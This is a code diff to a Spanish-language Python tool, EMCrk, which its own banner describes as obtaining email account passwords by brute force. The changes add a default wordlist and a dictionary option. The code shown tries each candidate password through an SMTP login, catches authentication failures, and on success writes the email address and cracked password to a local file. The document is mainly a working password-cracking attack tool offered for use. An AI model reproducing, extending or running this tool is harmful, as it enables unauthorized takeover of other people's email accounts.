@@ -21,6 +21,8 @@ import os
 
 Autor = "By: LawlietJH"
 Version = "v1.1.0"
+xD = False
+NombA = "pwd.zion"
 
 #EMCrk - Banner Random
 banner = str(Banner()+"{:>71}".format(Version)+"\n\n{:^80}".format("[-] Obten Contraseñas de Cuentas de Correos Por Fuerza Bruta [-]"))
@@ -129,13 +131,12 @@ def Correo():
 		exit(0)
 	
 
-def Diccionario():
+def Diccionario(NombreA):
 	
 	global Archivo
 	
 	#Se Pide El Diccionario
-	NombreA = input("\n [+] Preciona [Enter] o Pon Nombre Del Diccionario: ")
-
+	#~ NombreA = input("\n [+] Preciona [Enter] o Pon Nombre Del Diccionario: ")
 
 	#Comprobamos Si Existe El Diccionario
 	if path.exists(NombreA):
@@ -185,6 +186,7 @@ def Diccionario():
 				os.system('Timeout /nobreak 02 > Nul')
 				exit(0)
 
+
 def Conexion():
 	
 	global Archivo
@@ -205,14 +207,16 @@ def Conexion():
 		try:
 			smtpserver.login(Usuario, Pwd)
 			print (" ------> [!] Contraseña Encontrada: " + str(Pwd))
+			global xD
+			xD = True
 			
 			passwd=open('CC.zion','a')
 			
 			FechaF = time.strftime("\n\n\t [*] Fecha: %d/%m/%Y %H:%M:%S")
 			xD="\n\t"+FechaF+\
-			   "\n\t ------------------------------------------------- "+\
+			   "\n\t ____________________________________________________ "+\
 			   "\n\n\t [+] Correo: "+str(Usuario)+"\n\n\t [+] Contraseña: "+str(Pwd)+\
-			   "\n\t ------------------------------------------------- "
+			   "\n\t ==================================================== "
 			passwd.write(xD)
 			passwd.close()
 			print(time.strftime("\n\n\n\n\t [!] Finalizado: %d/%m/%Y %H:%M:%S"))
@@ -221,11 +225,12 @@ def Conexion():
 			os.system('Timeout /nobreak 03 > Nul')
 			exit(0)
 		except smtplib.SMTPAuthenticationError:
-			print ("\t [*] Contraseña Incorrecta: " + str(Pwd))
+			print ("\t [*] " + str(Pwd))
 	
 
 def main():
 	
+	global NombA
 	os.system('cls')
 	
 	if len(sys.argv) == 2:
@@ -234,13 +239,13 @@ def main():
 			print(ModoDeUso)
 			exit(0)
 			
-		if sys.argv[1] == "-v" or sys.argv[1] == "--version":
-			print("\n\n{:^80}\n{:^80}\n{:^80}".format("EMCrk",Autor[4:],Version[1:]))
-			exit(0)
-			
 		if sys.argv[1] == "-s" or sys.argv[1] == "--serv":
 			print(ServC)
 			exit(0)
+			
+		if sys.argv[1] == "-v" or sys.argv[1] == "--version":
+			print("\n\n{:^80}\n{:^80}\n{:^80}".format("EMCrk",Autor[4:],Version[1:]))
+			exit(0)	
 			
 		if sys.argv[1] == "-a" or sys.argv[1] == "--all":
 			print("\n\n{:^80}\n{:^80}\n{:^80}".format("EMCrk",Autor[4:],Version[1:]))
@@ -248,20 +253,21 @@ def main():
 			
 			print(banner)
 			Correo()
-			Diccionario()
+			Diccionario(NombA)
 			print(time.strftime("\t [!] Iniciado: %d/%m/%Y %H:%M:%S"))
 			Conexion()
 			print(time.strftime("\n\n\n\t [!] Finalizado: %d/%m/%Y %H:%M:%S"))
 			print ("\n\n\n\t\t [*] Vuelve a intentarlo...\n\n")
 			os.system('Timeout /nobreak 03 > Nul')
 			
-		if not sys.argv[1] == "-s" and not sys.argv[1] == "--serv"\
-		and not sys.argv[1] == "-v" and not sys.argv[1] == "--version"\
+		if not sys.argv[1] == "-a" and not sys.argv[1] == "--all"\
 		and not sys.argv[1] == "-h" and not sys.argv[1] == "--help"\
-		and not sys.argv[1] == "-a" and not sys.argv[1] == "--all":
+		and not sys.argv[1] == "-s" and not sys.argv[1] == "--serv"\
+		and not sys.argv[1] == "-v" and not sys.argv[1] == "--version":
 			print(ModoDeUso)
 			
 	elif len(sys.argv) == 3:
+		
 		if sys.argv[1] == "-v" or sys.argv[1] == "--version"\
 		or sys.argv[2] == "-v" or sys.argv[2] == "--version":
 			print("\n\n{:^80}\n{:^80}\n{:^80}".format("EMCrk",Autor[4:],Version[1:]))
@@ -271,9 +277,23 @@ def main():
 			print(ServC)
 			exit(0)
 			
-		if not sys.argv[1] == "-s" and not sys.argv[1] == "--serv"\
+		if sys.argv[1] == "-d" or sys.argv[1] == "--diccionario":
+			
+			NombA = sys.argv[2]
+			
+			print(banner)
+			Diccionario(NombA)
+			Correo()
+			Conexion()
+			print(time.strftime("\t [!] Iniciado: %d/%m/%Y %H:%M:%S"))
+			print(time.strftime("\n\n\n\t [!] Finalizado: %d/%m/%Y %H:%M:%S"))
+			print ("\n\n\n\t\t [*] Vuelve a intentarlo...\n\n")
+			os.system('Timeout /nobreak 03 > Nul')
+			
+		if not sys.argv[1] == "-a" and not sys.argv[1] == "--all"\
+		and not sys.argv[1] == "-d" and not sys.argv[1] == "--diccionario"\
+		and not sys.argv[1] == "-s" and not sys.argv[1] == "--serv"\
 		and not sys.argv[1] == "-v" and not sys.argv[1] == "--version"\
-		and not sys.argv[1] == "-a" and not sys.argv[1] == "--all"\
 		and not sys.argv[2] == "-s" and not sys.argv[2] == "--serv"\
 		and not sys.argv[2] == "-v" and not sys.argv[2] == "--version":
 			print(ModoDeUso)
@@ -284,11 +304,15 @@ def main():
 	else:
 		print(banner)
 		Correo()
-		Diccionario()
-		print(time.strftime("\t [!] Iniciado: %d/%m/%Y %H:%M:%S"))
+		Diccionario(NombA)
+		print("\n\t [!] Se Usará El Diccionario Por Defecto: pwd.zion")
 		Conexion()
-		print(time.strftime("\n\n\n\t [!] Finalizado: %d/%m/%Y %H:%M:%S"))
-		print ("\n\n\n\t\t [*] Vuelve a intentarlo...\n\n")
+		print(time.strftime("\n\n\n\t [!] Iniciado:   %d/%m/%Y %H:%M:%S"))
+		print(time.strftime("\n\t [!] Finalizado: %d/%m/%Y %H:%M:%S"))
+		
+		if xD == False:
+			print ("\n\n\n\t\t [*] Vuelve a intentarlo...\n\n")
+		
 		os.system('Timeout /nobreak 03 > Nul')
 
 
